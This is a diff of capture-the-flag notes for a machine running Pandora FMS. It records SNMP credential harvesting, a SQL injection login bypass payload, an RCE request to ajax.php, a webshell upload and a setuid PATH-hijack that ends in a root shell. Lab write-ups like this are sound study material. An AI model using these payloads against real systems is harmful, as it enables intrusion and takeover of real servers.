@@ -5,7 +5,9 @@
 ## Enumeration
 
 - nmap shows port 161 UDP open for snmp
-- 
+- `snmpwalk -v 1 -c public $IP`
+- Got creds: `Daniel:HotelBabylon23`
+- User flag is under user Matt
 
 ---
 
@@ -13,9 +15,6 @@
 
 ### SNMP
 
-- `snmpwalk -v 1 -c public $IP`
-- Got creds: `Daniel:HotelBabylon23`
-- User flag is under user Matt
 - Forwarded port 80 through SSH
 - Pandora FMS Login form? sqli?
 - Found metasploit module RCE
@@ -30,6 +29,11 @@ tsessions_php
 - Stole valid session ID as Matt: `g4e01qdgk36mfdh90hvcc54umq`
 - RCE vuln in POST Req to `/ajax.php`
 - Got revshell as matt
+- Could log in as admin using SQLi:
+
+```
+GET /pandora_console/include/chart_generator.php?session_id=1' union all select 1,2,'id_usuario|s:5:"admin";'-- -
+```
 
 ```
 POST /pandora_console/ajax.php HTTP/1.1
@@ -55,9 +59,54 @@ Connection: close
 page=include%2Fajax%2Fevents&target=whoami&response_id=1&perform_event_response=10000000
 ```
 
-- 
+- Logged in as admin
+- Uploaded webshell in file manager: uploaded in /images
+- Got reverse shell and user flag
 
 ---
 
 ## PrivEsc
 
+- First, generated OpenSSH key and logged in using SSH
+- in `pandora_backup` binary, tar is being called using absolute path and setuid is used: path hijacking
+
+```bash
+export PATH=$(pwd):$PATH
+touch tar
+nano tar
+
+matt@pandora:~$ cat tar
+#!/bin/bash
+id
+
+matt@pandora:~$ pandora_backup 
+
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+uid=0(root) gid=1000(matt) groups=1000(matt)
+Backup successful!
+Terminating program!
+```
+
+- For priv esc:
+
+```bash
+matt@pandora:~$ cat tar
+#!/bin/bash
+
+chmod +s /bin/bash
+
+matt@pandora:~$ pandora_backup 
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+Backup successful!
+Terminating program!
+
+matt@pandora:~$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# 
+
+```
+
+---
